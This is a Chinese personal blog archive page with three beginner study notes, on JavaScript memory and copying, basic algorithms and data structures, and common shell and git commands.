<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Archiv: 2018/2 | 吴博文</title>
  <meta name="author" content="吴博文">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="吴博文"/>

  
    <meta property="og:image" content=""/>
  
  
  <link href="/favicon.ico" rel="icon" type="image/x-ico">
  <link rel="canonical" href="http://yoursite.com/archives/2018/02/index.html" />
  <link rel="alternate" href="/atom.xml" title="吴博文" type="application/atom+xml">
  
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
  
<script type="text/javascript">
  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-45991394-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();
</script>

</head>


<body>
  <header id="header" class="inner"><div class="blog-header">
  <h1><a href="/">吴博文</a></h1>
  <h2><a href="/"></a></h2>
</div>
<nav id="main-nav" class="blog-nav">
  <ul>
    
      <li><a href="/">首页/Home</a></li>
    
      <li><a href="/archives">归档/Archives</a></li>
    
      <li><a href="/about">关于/About</a></li>
    
  </ul>
  <div class="clearfix"></div>
</nav>
<div class="clearfix"></div>
</header>
  <div id="content" class="inner">
    
      <div id="main-col" class="alignleft"><div id="wrapper">
<h2 class="archive-title">2018/2</h2>
<p></p>

  
    <article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-02-18T23:43:26.000Z"><a href="/2018/02/19/前端基础系列（四） -- 内存/">2018-02-19</a></time>
      
      
  
    <h1 class="title"><a href="/2018/02/19/前端基础系列（四） -- 内存/">前端基础系列（四） -- 内存</a></h1>
  

    </header>
    <div class="entry">
      
        <h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>电脑开机之后就把硬盘中的数据传输到内存中，例如操作系统，把硬盘中的操作系统读到内存中即是开机。内存特点是：存储数据快，一旦断电，数据就丢失了。与内存相对应的是外存，表示无论断电与否，数据都存在，外存的存储速度慢。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>Chrome 浏览器打开之后大约占用了 1G 的内存，分别分配给每个页面，每个页面大约占用 100M ，其中包括了：</p>
<pre><code>1. HTML + CSS
2. JavaScript
3. 网络 HTTP
4. 其他
</code></pre><p>所以 JavaScript 最多占用约 100M 的内存。</p>
<h2 id="内存分类"><a href="#内存分类" class="headerlink" title="内存分类"></a>内存分类</h2><p>JS 将内存划分为两个大区，分别是<strong>代码区（存储代码）</strong>和<strong>数据区（存储数据）</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let  a = 1  // 变量 a 存储在代码区  数字 1 存储在数据区 二者以 JS 引擎关联</span><br></pre></td></tr></table></figure></p>
<h4 id="数据区"><a href="#数据区" class="headerlink" title="数据区"></a>数据区</h4><p>数据区分为 <strong>Stack(栈内存)</strong> 和 <strong>Heap(堆内存)</strong>。</p>
<ul>
<li><p><strong>Stack（栈内存）</strong>存储方式是以一行一行存储，类似栈，故而叫做栈内存</p>
</li>
<li><p><strong>Heap（堆内存）</strong>存储方式是以堆存储</p>
</li>
</ul>
<h4 id="存储"><a href="#存储" class="headerlink" title="存储"></a>存储</h4><ol>
<li>数字是以 64 位浮点数进行存储</li>
<li>字符是以 16 位的进行存储。</li>
</ol>
<ul>
<li><p>存储 <code>var a = 1</code> 时，a 在代码区，1 以64位浮点数存储在栈内存。</p>
</li>
<li><p>存储 <code>var b = 2</code> 时，b 在代码区，2 以64位浮点数存储在栈内存。</p>
</li>
</ul>
<p><strong>注意：</strong>当 <code>b = a</code> 时，将 a 中的数据复制并覆盖到 b 的数据上。</p>
<ul>
<li><p>存储 <code>var a = true</code> 时，a 在代码区，true 转化为 1 ，之后以64位浮点数存储在栈内存。</p>
</li>
<li><p>存储 <code>var obj1 = {}</code> 时，obj1 在代码区，在栈内存中会存有一个以64位浮点数的地址，<strong>引用</strong>的是堆内存中的一个地址，obj1 中的数据将存储在堆内存中的一个地址，如果在后面在 <strong>添加 obj1 的属性</strong> ，继续放在堆内存中。</p>
</li>
<li><p>存储 <code>var obj2 = {}</code> 时，obj2 在代码区，在栈内存中会存有一个以64位浮点数的地址，<strong>引用</strong>的是堆内存中的一个地址，obj2 中的数据将存储在堆内存中的一个地址。</p>
</li>
</ul>
<p><strong>注意：</strong>当 <code>obj2 = obj1</code> 时，和 <code>b = a</code> 做的事情完全相同，即将 obj1 中的数据地址复制并覆盖到 obj2 的数据地址上。</p>
<h2 id="数据类型存储方法："><a href="#数据类型存储方法：" class="headerlink" title="数据类型存储方法："></a>数据类型存储方法：</h2><p>JavaScript 中有 7 种数据类型</p>
<ol>
<li><p>简单数据类型（6种）直接存储在 <strong>Stack（栈内存）</strong>中</p>
</li>
<li><p>复杂数据类型（Object）在 <strong>Stack（栈内存）</strong>中存储 <strong>Heap（堆内存）</strong>的地址</p>
<p><strong>所有的变量和对象的关系都是引用关系。</strong></p>
</li>
</ol>
<h2 id="套路："><a href="#套路：" class="headerlink" title="套路："></a>套路：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var a = &#123; n: 1 &#125;;  </span><br><span class="line">var b = a;</span><br><span class="line">a.x = a = &#123; n:2 &#125;;  //当浏览器运行这句话时，首先确定 a 的值，之后执行    &#123; n:2 &#125;，之后执行 a = &#123;  n:2 &#125;，之后执行 a.x (此时的 a 是之前确定的 a )。</span><br><span class="line">alert( a.x );  //undefined</span><br><span class="line">alert( b.x );  //[object Object]</span><br></pre></td></tr></table></figure>
<p>  <img src="http://upload-images.jianshu.io/upload_images/9617841-f91366eefddfc88f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="内存图"></p>
<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h4 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h4><p>如果一个对象没有被引用，就是垃圾，将会被回收（释放内存）。</p>
<h4 id="内存泄露"><a href="#内存泄露" class="headerlink" title="内存泄露"></a>内存泄露</h4><p>由于浏览器的 BUG ，使得应该被标记为垃圾的东西，没有被标记为垃圾，造成内存被永久占用，除非把浏览器关闭。<br><strong>解决方法</strong>：在关闭页面之前把所有的事件设置为 null 。</p>
<h4 id="浅拷贝-amp-深拷贝"><a href="#浅拷贝-amp-深拷贝" class="headerlink" title="浅拷贝&amp;深拷贝"></a>浅拷贝&amp;深拷贝</h4><h6 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var a = 1;</span><br><span class="line">var b = a;  </span><br><span class="line">b = 2;        // b 变不影响 a，即是深拷贝</span><br><span class="line">alert( a );  // 1</span><br></pre></td></tr></table></figure>
<p>对于<strong>基本类型</strong>，所有的赋值 “ = “ 都是深拷贝</p>
<p>所以在谈及深拷贝和浅拷贝时是不考虑基本类型的，因为基本类型的赋值都是深拷贝</p>
<h6 id="复杂数据类型（Object）"><a href="#复杂数据类型（Object）" class="headerlink" title="复杂数据类型（Object）"></a>复杂数据类型（Object）</h6><p>浅拷贝：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var a = &#123; name : &apos;a&apos; &#125;;</span><br><span class="line">var b = a;</span><br><span class="line">b.name = &apos;b&apos; ;   // b 变致 a 变，即是浅拷贝</span><br><span class="line">alert( a.name );  // &apos;b&apos;</span><br></pre></td></tr></table></figure></p>
<p>深拷贝：b 复制 a 的所有数据，但是地址不同，最终的结果就是 b 变是 b 自己的事情，与 a 无关，即 b 变不影响 a </p>

      
    </div>
    <footer>
            
        
  
  <div class="tags">
    <a href="/tags/前端基础/">前端基础</a>
  </div>

                
      

      <div class="clearfix"></div>
    </footer>
  </div>
</article>

  
    <article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-02-18T23:41:25.000Z"><a href="/2018/02/19/前端基础系列（三） -- 算法 + 数据结构基础/">2018-02-19</a></time>
      
      
  
    <h1 class="title"><a href="/2018/02/19/前端基础系列（三） -- 算法 + 数据结构基础/">前端基础系列（三） -- 算法 + 数据结构基础</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="结构化编程"><a href="#结构化编程" class="headerlink" title="结构化编程"></a>结构化编程</h1><ol>
<li>一行一行执行</li>
<li>有条件控制语句 if…else…</li>
<li>有循环控制语句 while(exp) do…<h2 id="伪代码"><a href="#伪代码" class="headerlink" title="伪代码"></a>伪代码</h2><h2 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h2></li>
</ol>
<h1 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h1><ol>
<li><strong>输入</strong>：一个算法必须有<strong>零个</strong>或以上输入量。</li>
<li><strong>输出</strong>：一个算法应有一个或以上输出量，输出量是算法计算的结果。</li>
<li><strong>明确性</strong>：算法的描述必须无歧义，以保证算法的实际执行结果是精确地 匹配要求或期望，通常要求实际运行结果是确定的。</li>
<li><strong>有限性</strong>：依据图灵的定义，一个算法是能够被任何图灵完备系统模拟的一串运算，而图灵机只有有限个状态、有限个输入符号和有限个转移函数（指令）。而一些定义更规定算法必须在有限个步骤内完成任务。</li>
<li><strong>有效性</strong>：又称可行性。能够实现，算法中描述的操作都是可以通过已经实现的基本运算执行有限次来实现。</li>
</ol>
<h1 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h1><p>即数据的结构</p>
<h3 id="哈希（Hash）"><a href="#哈希（Hash）" class="headerlink" title="哈希（Hash）"></a>哈希（Hash）</h3><p>键值对： <code>{ &#39;键&#39;  : &#39;值&#39; }</code> ==&gt;  Array / Object</p>
<ul>
<li><p><strong>计数排序</strong>：计数排序使用一个额外的数组 <code>arr</code> （<em>hash</em>），其中第 i 个元素是待排序数组  <code>Arr</code> 中值等于 i 的元素的个数。然后根据数组 <code>arr</code> 来将 <code>Arr</code> 中的元素排到正确的位置（用到了桶，但是每个桶中只有相同的数字，空间浪费）（<strong>所有的桶是Hash，桶里是队列，先进先出</strong>）。<br>  <strong>复杂度：<code>n + max</code></strong><br>  <strong>缺点：</strong></p>
<pre><code>1. 需要一个哈希表示计数工具。
2. 无法对小数和负数排序
</code></pre></li>
<li><p><strong>桶排序</strong>：将数组分到有限数量的桶里。每个桶再个别排序，此时可以用其他排序方法（<strong>所有的桶是Hash，桶里是队列，先进先出</strong>）</p>
</li>
<li><p><strong>基数排序</strong>：只有十个桶（0 - 9），先排个位，之后十位，依次到最高位（<strong>所有的桶是Hash，桶里是队列，先进先出</strong>）<br><strong>说明：比较排序的极限 <code>n*logN</code></strong></p>
</li>
</ul>
<h3 id="队列（queue）"><a href="#队列（queue）" class="headerlink" title="队列（queue）"></a>队列（queue）</h3><ul>
<li>特点：<strong>先进先出</strong></li>
<li>可以用数组实现</li>
</ul>
<h3 id="栈（stack）"><a href="#栈（stack）" class="headerlink" title="栈（stack）"></a>栈（stack）</h3><ul>
<li>特点：<strong>先进后出</strong></li>
<li>可以用数组实现</li>
</ul>
<h3 id="链表（Linked-List）"><a href="#链表（Linked-List）" class="headerlink" title="链表（Linked List）"></a>链表（Linked List）</h3><ul>
<li><p>是一种线性表，但是并不会按线性的顺序存储数据，而是在每一个节点里存到下一个节点的<strong>指针(Pointer)</strong>。使用链表结构可以克服数组链表需要预先知道数据大小的缺点，链表结构可以充分利用计算机内存空间，实现灵活的内存动态管理。但是链表失去了数组随机读取的优点，同时链表由于增加了结点的指针域，空间开销比较大</p>
</li>
<li><p>数组无法直接删除中间的一项，但是链表可以，链表是<strong>动态数组</strong></p>
</li>
<li><p>Hash 实现链表，<strong>head</strong> 表示第一个 Hash ，所有的 Hash 都是节点（<strong>node</strong>）</p>
</li>
</ul>
<h3 id="树"><a href="#树" class="headerlink" title="树"></a>树</h3><ul>
<li><p>是一种抽象数据类型（ADT）或是实作这种抽象数据类型的数据结构，用来模拟具有树状结构性质的数据集合。它是由n（n&gt;0）个有限节点组成一个具有<strong>层次关系</strong>的集合</p>
</li>
<li><p><strong>特点</strong>：</p>
<ol>
<li>每个节点有零个或多个子节点</li>
<li>没有父节点的节点称为根节点</li>
<li>每一个非根节点有且只有一个父节点</li>
<li>除了根节点外，每个子节点可以分为多个不相交的子树</li>
</ol>
</li>
<li><p><strong>术语</strong>：</p>
<ol>
<li>节点的<strong>层次</strong>：从根开始定义起，根为第1层，根的子节点为第2层，以此类推；</li>
<li><strong>深度</strong>：对于任意节点n,n的深度为从根到n的唯一路径长，根的深度为0；</li>
<li><strong>节点的度</strong>：一个节点含有的子树的个数称为该节点的度；</li>
<li><strong>树的度</strong>：一棵树中，最大的节点的度称为树的度；</li>
<li><strong>叶节点</strong>或<strong>终端节点</strong>：度为零的节点；</li>
</ol>
</li>
<li><p><strong>二叉树（Binary tree）</strong>：每个节点<strong>最多</strong>含有<strong>两个子树</strong>的树称为二叉树</p>
<ol>
<li>二叉树的第 i 层至多拥有<strong>2的( i-1 )次幂</strong>个节点数</li>
</ol>
</li>
<li><p><strong>完全二叉树</strong>：对于一颗二叉树，假设其深度为d（d&gt;1）。除了第d层外，其它各层的节点数目均已达最大值，且第d层所有节点从左向右连续地紧密排列，这样的二叉树被称为完全二叉树</p>
<ol>
<li><p>在一棵二叉树中，除<strong>最后一层</strong>外，若其余层都是满的，并且最后一层<strong>或者</strong>是满的，<strong>或者</strong>是在<strong>右边</strong>缺少连续若干节点，则此二叉树为<strong>完全二叉树</strong>（Complete Binary Tree）</p>
</li>
<li><p>具有n个节点的完全二叉树的深度为<strong>log以2为底n的对数＋1</strong>。深度为k的完全二叉树，至少有<strong>2的ｋ次幂</strong>个节点，至多有<strong>2的( k+1 )次幂 - 1</strong>个节点</p>
</li>
</ol>
</li>
<li><p><strong>满二叉树</strong>：所有叶节点都在最底层的完全二叉树</p>
<ol>
<li><p>一棵深度为k，且有<strong>2的( k+1 )次幂 - 1</strong>个节点的二叉树，称为<strong>满二叉树（Full Binary Tree）</strong></p>
</li>
<li><p>每一层上的节点数都是最大节点数</p>
</li>
</ol>
</li>
</ul>
<p><strong>说明：用数组存储满二叉树和完全二叉树，用Hash存储其他的树</strong></p>
<h1 id="算法和数据结构结合"><a href="#算法和数据结构结合" class="headerlink" title="算法和数据结构结合"></a>算法和数据结构结合</h1><ol>
<li>我们要解决一个跟数据相关的问题</li>
<li>分析这个问题，想出对应的数据结构</li>
<li>分析数据结构，想出算法<br><strong>数据结构和算法是互相依存、不可分开的</strong></li>
</ol>
<h3 id="分类："><a href="#分类：" class="headerlink" title="分类："></a>分类：</h3><ol>
<li><p><strong>分治法</strong>：把一个问题分区成互相独立的多个部分分别求解的思路。这种求解思路带来的好处之一是便于进行并行计算。<strong>前端主要使用分治法</strong></p>
</li>
<li><p><strong>动态规划法</strong>：当问题的整体最优解就是由局部最优解组成的时候，经常采用的一种方法</p>
</li>
<li><p><strong>贪婪算法</strong>：常见的近似求解思路。当问题的整体最优解不是（或无法证明是）由局部最优解组成，且对解的最优性没有要求的时候，可以采用的一种方法</p>
</li>
<li><p><strong>线性规划法</strong>：见词条</p>
</li>
<li><p><strong>简并法</strong>：把一个问题通过逻辑或数学推理，简化成与之等价或者近似的、相对简单的模型，进而求解的方法</p>
</li>
</ol>
<h1 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h1><ul>
<li><strong>冒泡排序</strong>：它重复地走访过要排序的数列，一次比较两个元素，如果他们的顺序错误就把他们交换过来。走访数列的工作是重复地进行直到没有再需要交换，也就是说该数列已经排序完成。<br>这个算法的名字由来是因为越大的元素会经由交换慢慢“浮”到数列的顶端，故名。</li>
</ul>
<ul>
<li><strong>选择排序</strong>：首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置，然后，再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。以此类推，直到所有元素均排序完毕。</li>
</ul>
<ul>
<li><strong>插入排序</strong>：通过构建有序序列，对于未排序数据，在<strong>已排序序列</strong>中从后向前扫描，找到相应位置并插入。插入排序在实现上，通常采用in-place排序（即只需用到的额外空间的排序），因而在从后向前扫描过程中，需要反复把已排序元素逐步向后挪位，为最新元素提供插入空间。</li>
</ul>
<ul>
<li><strong>基数排序</strong>：将整数按位数切割成不同的数字，然后按每个位数分别比较。将所有待比较数值（正整数）统一为同样的数位长度，数位较短的数前面补零。然后，从<strong>最低位</strong>开始，依次进行一次排序。这样从<strong>最低位</strong>排序一直到<strong>最高位</strong>排序完成以后，数列就变成一个有序序列。</li>
</ul>
<ul>
<li><strong>快速排序</strong>：快速排序使用分治法（Divide and conquer）策略来把一个序列（list）分为两个子序列（sub-lists）。<br>步骤为：<ol>
<li>从数列中挑出一个元素，称为”基准”（pivot），</li>
<li>重新排序数列，所有比基准值小的元素摆放在基准前面，所有比基准值大的元素摆在基准后面（相同的数可以到任何一边）。在这个分区结束之后，该基准就处于数列的中间位置。这个称为<strong>分区（partition）</strong>操作。</li>
<li>递归地（recursively）把小于基准值元素的子数列和大于基准值元素的子数列排序。<br>递归到最底部时，数列的大小是零或一，也就是已经排序好了。这个算法一定会结束，因为在每次的迭代（iteration）中，它至少会把一个元素摆到它最后的位置去。</li>
</ol>
</li>
</ul>

      
    </div>
    <footer>
            
        
  
  <div class="tags">
    <a href="/tags/前端基础/">前端基础</a>
  </div>

                
      

      <div class="clearfix"></div>
    </footer>
  </div>
</article>

  
    <article class="post">
  
    <div class="gallery">
  <div class="photoset">
    
      <img src="">
    
  </div>
  <div class="control">
    <div class="prev"></div>
    <div class="next"></div>
  </div>
</div>
  
  <div class="post-content">
    <header>
      
        <div class="icon"></div>
        <time datetime="2018-02-18T23:40:03.000Z"><a href="/2018/02/19/前端基础系列（二） -- 命令行基础/">2018-02-19</a></time>
      
      
  
    <h1 class="title"><a href="/2018/02/19/前端基础系列（二） -- 命令行基础/">前端基础系列（二） -- 命令行基础</a></h1>
  

    </header>
    <div class="entry">
      
        <h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>命令行操作会解放我们的鼠标，让我们更加流畅的进行我们想要的操作</p>
<h1 id="文件与文件夹（目录）"><a href="#文件与文件夹（目录）" class="headerlink" title="文件与文件夹（目录）"></a>文件与文件夹（目录）</h1><ul>
<li><code>~</code> ==&gt; 用户目录</li>
<li><code>/</code> ==&gt; 所有硬盘</li>
<li><code>.</code> ==&gt; 当前目录</li>
<li><code>..</code> ==&gt; 父级目录</li>
<li><code>$</code> ==&gt; 已准备好</li>
<li><code>directory</code> ==&gt; 目录文件夹</li>
<li><code>file</code> ==&gt; 文件</li>
<li><code>make</code> ==&gt; 新建</li>
<li><code>remove</code> ==&gt; 删除</li>
<li><code>move</code> ==&gt; 移动</li>
<li><code>list</code> ==&gt; 枚举</li>
<li><code>link</code> ==&gt; 链接（windows不支持）</li>
<li><code>find</code> ==&gt; 查找</li>
<li><code>echo</code> ==&gt; 发出回音、重复</li>
<li><code>touch</code> ==&gt; 触摸</li>
<li><code>change</code> ==&gt; 改变</li>
<li><code>copy</code> ==&gt; 复制</li>
</ul>
<h1 id="缩写规则"><a href="#缩写规则" class="headerlink" title="缩写规则"></a>缩写规则</h1><p>删除元音字母（A E I O U）,保留前两个到三个辅音</p>
<ul>
<li><code>mkdir</code> ==&gt; <code>make directory</code> ==&gt; 创建目录</li>
<li><code>rm</code> ==&gt; <code>remove</code> ==&gt; 删除</li>
<li><code>mv</code> ==&gt; <code>move</code> ==&gt; 移动、重命名</li>
<li><code>cp</code> ==&gt; <code>copy</code> ==&gt; 复制</li>
<li><code>ls</code> ==&gt; <code>list</code> ==&gt; 枚举</li>
<li><code>cd</code> ==&gt; <code>change directory</code> ==&gt; 改变目录</li>
<li><code>-rf</code> ==&gt; 用于删除目录，其中：<ul>
<li><code>-r</code> ==&gt; 文件夹的递归操作</li>
<li><code>-f</code> ==&gt; 强制，否则每个文件都要询问</li>
</ul>
</li>
</ul>
<h1 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h1><ul>
<li><p><code>cd</code> ==&gt; 进入目录</p>
</li>
<li><p><code>pwd</code> ==&gt; 显示当前目录 </p>
</li>
<li><p><code>mkdir 目录名</code> ==&gt; 创建目录</p>
</li>
<li><p><code>mkdir -p 目录路径</code> ==&gt; 创建目录（<em>eg.：mkdir -p demo/outter/inner</em>），如果<code>目录路径</code>有特殊字符（<em>eg.：空格</em>）要加引号。所以坚决避免有特殊字符</p>
</li>
<li><p><code>whoami</code> ==&gt; 我是谁</p>
</li>
<li><p><code>ls</code> ==&gt; 查看路径</p>
</li>
<li><p><code>ls -a</code> ==&gt; 查看路径（显示所有文件【包括隐藏文件】）</p>
</li>
<li><p><code>ls -l</code> ==&gt; 查看路径（包括详细信息）</p>
</li>
<li><p><code>ls -al</code> | <code>ls -la</code> ==&gt; <code>ls -a</code> + <code>ls -l</code></p>
</li>
<li><p><code>touch 文件名</code> ==&gt; 创建文件</p>
</li>
<li><p><code>touch 文件名（已存在的文件名）</code> ==&gt; 改变文件更新时间</p>
</li>
<li><p><code>cp 源路径 目标路径</code> ==&gt; 复制文件</p>
</li>
<li><p><code>cp -r 源路径 目标路径</code> ==&gt; 复制目录</p>
</li>
<li><p><code>mv 源路径 目标路径</code> ==&gt; 移动节点</p>
</li>
<li><p><code>rm 文件路径</code> ==&gt; 删除文件</p>
</li>
<li><p><code>rm -f 文件路径</code> ==&gt; 强制删除文件</p>
</li>
<li><p><code>rm -r 目录路径</code> ==&gt; 删除目录</p>
</li>
<li><p><code>rm -rf 目录路径</code> ==&gt; 强制删除目录</p>
</li>
<li><p><code>curl -L http://www.baidu.com &gt; baidu.html</code> ==&gt; 下载文件</p>
</li>
<li><p><code>df -kh</code> ==&gt; 磁盘占用</p>
</li>
<li><p><code>du -sh</code> ==&gt; 当前目录大小</p>
</li>
<li><p><code>du -h</code> ==&gt; 各文件大小</p>
</li>
</ul>
<h1 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h1><p>使用 git 三种方式</p>
<ol>
<li>只在本地上使用</li>
<li>将本地仓库上传到github</li>
<li>下载github上的仓库</li>
</ol>
<h3 id="git命令"><a href="#git命令" class="headerlink" title="git命令"></a>git命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git clone &apos;SSH地址&apos; ==&gt; 下载仓库</span><br><span class="line">git init  ==&gt; 初始化本地仓库 .git 目录</span><br><span class="line">git status -sb ==&gt; 显示当前所有文件状态</span><br><span class="line">git add . ==&gt; 把当前目录（&apos;.&apos; 表示当前目录）里面的变动添加到【暂存区】</span><br><span class="line">git commit -m &apos;信息&apos; ==&gt; 将 &apos;add&apos; 的内容【正式提交】到本地仓库，并添加注释信息</span><br><span class="line">git commit --amend -m &apos;信息&apos; ==&gt; 修改上次的注释信息</span><br><span class="line">git log ==&gt; 历史变动</span><br></pre></td></tr></table></figure>
<p><code>git status -sb</code> ==&gt; <code>-s(summary)：显示总结</code> + <code>-b(branch)：显示分支</code><br><code>start css/style.css</code> ==&gt; 使用默认编辑器打开 style.css<br>如果有新的变动，需要一次执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m &apos;信息&apos;</span><br></pre></td></tr></table></figure></p>
<ul>
<li><code>git status -sb</code> ==&gt; 显示当前所有文件状态，其中：<br>  <code>??</code> ==&gt; 表示待处理<br>  <code>A</code> ==&gt; 表示添加<br>  <code>M</code> ==&gt; 表示这个文件被修改了（Modified）</li>
</ul>
<h3 id="本地使用"><a href="#本地使用" class="headerlink" title="本地使用"></a>本地使用</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git init</span><br><span class="line">mkdir + touch</span><br><span class="line">git add .</span><br><span class="line">git commit -m &apos;信息&apos;</span><br></pre></td></tr></table></figure>
<h3 id="将本地仓库上传到github"><a href="#将本地仓库上传到github" class="headerlink" title="将本地仓库上传到github"></a>将本地仓库上传到github</h3><p>create a new repository on the command line<br>创建一个新仓库在命令行中<br>push an existing repository from the command line<br>添加一个现有的仓库从命令行<br><strong>注</strong>：existing — 现有</p>
<h3 id="直接在github创建一个仓库然后下载本地"><a href="#直接在github创建一个仓库然后下载本地" class="headerlink" title="直接在github创建一个仓库然后下载本地"></a>直接在github创建一个仓库然后下载本地</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">create a new repository</span><br><span class="line">repository name</span><br><span class="line">Decription</span><br><span class="line">Initilize this repository with a README</span><br><span class="line">Add .gitignore : Node</span><br><span class="line">Add a license : MIT License</span><br><span class="line">clone or download</span><br><span class="line">Use SSH ==&gt; git@github.com开头地址</span><br><span class="line">在要粘贴的文件夹 git bash here</span><br><span class="line">git clone &apos;地址&apos;</span><br></pre></td></tr></table></figure>
<h3 id="上传更新"><a href="#上传更新" class="headerlink" title="上传更新"></a>上传更新</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. git add 文件路径</span><br><span class="line">2. git commit -m &apos;信息&apos;</span><br><span class="line">3. git pull</span><br><span class="line">4. git push</span><br></pre></td></tr></table></figure>
<p><strong>注</strong>：在命令行中输入命令是区分大小写</p>
<h3 id="github-上删除-node-modules"><a href="#github-上删除-node-modules" class="headerlink" title="github 上删除 node_modules"></a>github 上删除 node_modules</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git rm -r --cached node_modules  // --cached不会把本地的.idea删除</span><br><span class="line">git commit -m &apos;delete node_modules&apos;</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure>
<h1 id="命令行技巧"><a href="#命令行技巧" class="headerlink" title="命令行技巧"></a>命令行技巧</h1><h3 id="bashrc"><a href="#bashrc" class="headerlink" title="~/.bashrc"></a>~/.bashrc</h3><p>~/.bashrc 文件的功能很强大</p>
<p>自动运行</p>
<ol>
<li><code>touch ~/.bashrc</code></li>
<li><code>start ~/.bashrc</code></li>
<li>编辑 <code>~/.bashrc</code>，内容为 <code>cd ~/Desktop</code>，重启 Git Bash，默认就进入桌面目录了<br>可以用 <code>~/.bashrc</code> 在进入 Git Bash 前执行任何命令，十分方便</li>
</ol>
<h3 id="alias"><a href="#alias" class="headerlink" title="alias"></a>alias</h3><ol>
<li>在 <code>~/.bashrc</code> 里新增一行 <code>alias b=&quot;echo &#39;bowen is awesome&#39;&quot;</code></li>
<li>运行 <code>source ~/.bashrc</code>，作用是执行 <code>~/.bashrc</code></li>
<li>运行<code>b</code>，就会看到 <code>bowen is awesome</code></li>
<li>也就是说，现在 <code>b</code> 就是 <code>echo &#39;bowen is awesome&#39;</code> 的缩写了</li>
</ol>
<h5 id="常见命令缩写"><a href="#常见命令缩写" class="headerlink" title="常见命令缩写"></a>常见命令缩写</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">alias la=&apos;ls -a&apos;</span><br><span class="line">alias ll=&apos;ls -l&apos;</span><br><span class="line">alias gst=&apos;git status -sb&apos;</span><br><span class="line">alias ga=&apos;git add&apos;</span><br><span class="line">alias ga.=&apos;git add .&apos;</span><br><span class="line">alias gc=&apos;git commit&apos;</span><br><span class="line">alias gc.=&apos;git commit .&apos;</span><br></pre></td></tr></table></figure>
<p>保存退出，然后运行 <code>source ~/.bashrc</code></p>
<h1 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h1><ul>
<li>绝对路径： 以 <code>/</code> 开头的路径就是绝对路径</li>
<li>隐藏文件以 <code>.</code> 开头</li>
